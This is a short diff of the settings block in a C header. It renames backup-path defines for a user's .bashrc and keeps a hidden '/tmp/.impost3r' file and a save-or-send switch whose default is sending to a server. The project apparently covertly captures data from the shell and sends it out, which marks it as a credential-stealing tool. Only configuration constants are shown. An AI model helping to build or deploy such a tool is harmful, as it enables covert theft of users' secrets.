@@ -8,7 +8,8 @@
     Custom setting
 */
 # define FILENAME "/tmp/.impost3r"
-# define BACKUP_BASHRC "/tmp/.bashrc"
+# define BACKUP_ORI_FILENAME ".bashrc"
+# define BACKUP_ORI_PATH "/tmp/.bashrc"
 # define SAVE_OR_SEND 0 //send=0,save=1,default is send
 /*
     Send to server
